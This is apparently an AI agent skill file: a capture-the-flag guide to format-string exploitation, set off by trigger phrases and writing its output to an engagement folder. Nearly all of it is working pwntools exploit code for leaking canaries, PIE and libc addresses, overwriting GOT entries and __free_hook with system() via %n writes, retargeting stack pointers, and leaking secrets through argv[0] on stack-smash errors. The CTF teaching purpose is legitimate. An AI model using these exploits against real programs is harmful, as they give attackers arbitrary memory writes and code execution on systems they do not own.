---
name: pwn-format-string
description: "CTF format string exploitation. GOT overwrite via %n, canary/PIE leak, argument retargeting, blind pwn, free_hook overwrite, argv[0] stack smash info leak, format string game state manipulation. Triggers: 'format string', 'printf exploit', 'fsb', '%n exploit', 'got overwrite', 'format string vulnerability', 'printf format string', 'libc leak format string'."
---

# CTF Pwn: Format String Exploitation

GOT overwrite, canary/PIE leak, blind pwn, __free_hook, argument retargeting.

## Install

```bash
pip install pwntools --break-system-packages
apt-get install -y gdb pwndbg ROPgadget
```

---

## Phase 1: Reconnaissance

```bash
BINARY="./challenge"

checksec "$BINARY"
objdump -d "$BINARY" | grep -E "<printf|<puts|<scanf"
# Find format string call and RELRO type

# RELRO levels:
# No RELRO   → GOT writable
# Partial    → GOT writable (only .got.plt)
# Full       → GOT read-only → use __free_hook, ret addr
```

---

## Phase 2: Find Format String Offset

```python
from pwn import *

p = process('./challenge')

# Brute-force offset (where input appears on stack):
for i in range(1, 50):
    p = process('./challenge')
    p.sendline(f'AAAA.%{i}$p'.encode())
    resp = p.recvall(timeout=1)
    if b'0x41414141' in resp or b'41414141' in resp:
        print(f"Offset: {i}")
        break
    p.close()

# OR, send multiple at once:
p = process('./challenge')
p.sendline(b'%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p')
print(p.recvline())  # Find which position prints your input or a recognizable value
```

---

## Phase 3: Leak Canary and PIE Base

```python
from pwn import *

p = process('./challenge')

# Canary is usually ~offset 39, return addr ~41-43 (varies):
p.sendline(b'%39$p.%41$p')
resp = p.recvline().decode()
parts = resp.split('.')

canary = int(parts[0], 16)
ret_addr = int(parts[1], 16)

# Derive PIE base:
# ret_addr usually points into __libc_start_main or main
# Find known function offset via: objdump -d binary | grep main
known_offset = 0x1234   # replace with actual
pie_base = ret_addr - known_offset

print(f"Canary: {hex(canary)}")
print(f"PIE base: {hex(pie_base)}")

# Now build overflow with known canary:
OFFSET = 120
WIN = pie_base + 0x1234  # win() offset
payload = b'A' * OFFSET + p64(canary) + b'B' * 8 + p64(WIN)
p.sendline(payload)
p.interactive()
```

---

## Phase 4: GOT Overwrite

```python
from pwn import *

elf = ELF('./challenge')
p = process('./challenge')

FORMAT_OFFSET = 6   # from Phase 2
TARGET_GOT = elf.got['exit']    # or printf, puts, putchar
WIN_ADDR = elf.symbols['win']   # or libc system()

# Using pwntools fmtstr_payload:
payload = fmtstr_payload(FORMAT_OFFSET, {TARGET_GOT: WIN_ADDR})
p.sendline(payload)
p.interactive()

# Manual (for full control):
# Win addr must be written as 8 bytes → use %lln
fmt = f'%{WIN_ADDR & 0xFFFF}c%{FORMAT_OFFSET + 2}$lln'.encode()  # write low 2 bytes
# IMPORTANT: %lln writes 8 bytes, zeroing upper half: clean but large output
```

---

## Phase 5: Argument Retargeting (Filter Bypass)

```python
from pwn import *

# When: can't embed addresses directly (bad chars), but stack pointer is available

p = process('./challenge')
FORMAT_OFFSET = 6

# Find: stack pointer on stack that points to another stack location
# Overwrite it to point to target (GOT entry)

# Step 1: Leak stack addresses to find pointer chain:
p.sendline(b'%6$p.%7$p.%8$p.%9$p.%10$p')  # find stack pointers
# Identify which arg is a pointer to another stack location

# Step 2: Use non-positional %n to overwrite pointer at stack arg N:
# %Xc%n advances counter to X chars, writes to arg (consumed in order)
# Calculate: how many %c needed to reach the pointer arg, then %n

GOT_EXIT = 0x404018
WIN = 0x4011f6

# Write exit@GOT into arg pointer slot (non-positional):
n_args_before = 12  # args before the pointer we want to overwrite
target_val = GOT_EXIT
delta = target_val  # chars to print before %n
fmt = b'%c' * n_args_before + f'%{delta}c%n'.encode()
# Then in next call: write WIN to exit@GOT using same technique
```

---

## Phase 6: __free_hook Overwrite (glibc < 2.34)

```python
from pwn import *

p = process('./challenge')
elf = ELF('./challenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

FORMAT_OFFSET = 8

# Leak libc via format string:
p.sendline(b'%43$p')  # common offset for __libc_start_main
leaked = int(p.recvline().strip(), 16)
libc.address = leaked - libc.symbols['__libc_start_main'] - 0x80  # adjust

free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

print(f"libc base: {hex(libc.address)}")
print(f"__free_hook: {hex(free_hook)}")
print(f"system: {hex(system)}")

# Write system() to __free_hook:
payload = fmtstr_payload(FORMAT_OFFSET, {free_hook: system}, write_size='byte')
p.sendline(payload)

# Now trigger free("cat flag.txt"):
# The string "cat flag.txt" must be in the buffer when free() is called
p.sendline(b'cat flag.txt')
p.interactive()
```

---

## Phase 7: Game State Manipulation

```python
from pwn import *

p = remote('challenge', 1337)
p.recvuntil(b'Enter your name: ')

# %Xc prints X characters; %N$n writes that count to stack position N
# Find: which stack position holds pointer to player chips
# Vary X and N, watch what changes in game output

# Write high value to player chips (stack pos 7):
p.sendline(b'%9999c%7$n')
p.interactive()
```

---

## Phase 8: argv[0] Stack Smash Info Leak

```python
from pwn import *

p = remote('challenge', 1337)

# Layout: stack overflow past canary → argv[0] (stack pointer to program name)
# Overwrite argv[0] with address of secret/password global
# When canary check fails → __stack_chk_fail prints it

SECRET_ADDR = 0x601090   # address of global secret/password

CANARY_OFFSET = 40
ARGV0_OFFSET = 200       # adjust via GDB: find where argv[0] is on stack

payload = b'A' * CANARY_OFFSET   # deliberately corrupt canary
payload += b'B' * (ARGV0_OFFSET - CANARY_OFFSET)
payload += p64(SECRET_ADDR)

p.sendline(payload)
# Output: "*** stack smashing detected ***: <secret_value> terminated"
resp = p.recvall(timeout=3)
print(resp)
```

---

## Format String Write Size Reference

| Specifier | Bytes | Use Case |
|-----------|-------|----------|
| `%hhn` | 1 | Byte-by-byte write |
| `%hn` | 2 | Word write |
| `%n` | 4 | Dword write |
| `%lln` | 8 | Qword write (zeros upper bytes) |

**GOT on x86-64:** 8-byte entries → use `%lln` for full 64-bit write (clears upper bytes cleanly).

---

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working exploit
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-rop` for ROP chains after leak
→ `ctf-pwn-basics` for BOF offset finding
